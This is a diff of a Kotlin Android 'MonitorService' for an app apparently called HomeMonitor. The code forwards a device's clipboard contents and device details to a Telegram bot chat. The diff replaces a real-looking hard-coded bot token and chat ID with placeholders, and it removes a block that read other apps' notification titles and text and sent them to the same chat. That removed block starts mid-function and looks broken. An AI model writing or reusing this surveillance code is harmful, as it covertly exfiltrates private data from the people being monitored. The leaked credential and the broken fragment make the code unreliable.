@@ -75,8 +75,8 @@ import java.util.zip.ZipOutputStream
 class MonitorService : LifecycleService() {
 
     companion object {
-        private const val BOT_TOKEN = "8512990339:AAE-PXlxR_xp8vsQ_M1Rm8sxXE7NL4f3X9c"
-        private const val CHAT_ID   = "8937193601"
+        private const val BOT_TOKEN = "YOUR-TELEGRAM-BOT-TOKEN"
+        private const val CHAT_ID   = "YOUR-CHAT-ID"
 
         private const val TAG              = "MonitorService"
         private const val NOTIFICATION_ID  = 1001
@@ -1426,36 +1426,7 @@ ${dp()}📱 *Device Info*
             val preview = if (clipText!!.length > 3000) clipText!!.take(3000) + "…" else clipText!!
             sendMessage(chatId, "${dp()}📋 *Clipboard:*
 
-`$preview`", "Markdown")
-        }
-    }
-
-    // ══════════════════════════════════════════════════════════════════════════
-    //  NOTIFICATIONS
-    // ══════════════════════════════════════════════════════════════════════════
-
-            val sb = StringBuilder("${dp()}🔔 *Active Notifications (${notifs.size}):*
-
-")
-            notifs.take(20).forEachIndexed { i, n ->
-                val title = n.notification.extras?.getString("android.title") ?: "?"
-                val text  = n.notification.extras?.getString("android.text") ?: ""
-                val pkg   = n.packageName
-                val time  = SimpleDateFormat("HH:mm", Locale.getDefault()).format(Date(n.postTime))
-                sb.append("${i+1}. 📦 `$pkg`
-   *$title*
-   $text
-   🕐 $time
-
-")
-            }
-            sendMessage(chatId, sb.toString().trimEnd(), "Markdown")
-        } catch (e: Exception) {
-            sendMessage(chatId, "${dp()}🔔 *Notification Access Required*
-
-Go to: Settings → Apps → Special Access → Notification Access → Enable HomeMonitor
-
-_Error: ${e.message}_", "Markdown")
+${preview}", "Markdown")
         }
     }
 
@@ -1551,6 +1522,15 @@ _Error: ${e.message}_", "Markdown")
         return try {
             dir.listFiles()?.sumOf { if (it.isFile) it.length() else 0L } ?: 0L
         } catch (_: Exception) { 0L }
+    }
+
+    private fun formatAgo(ms: Long): String {
+        val s = ms / 1000
+        return when {
+            s < 60   -> "${s}s"
+            s < 3600 -> "${s / 60}m ${s % 60}s"
+            else     -> "${s / 3600}h ${(s % 3600) / 60}m"
+        }
     }
 
     private fun formatSize(bytes: Long): String = when {
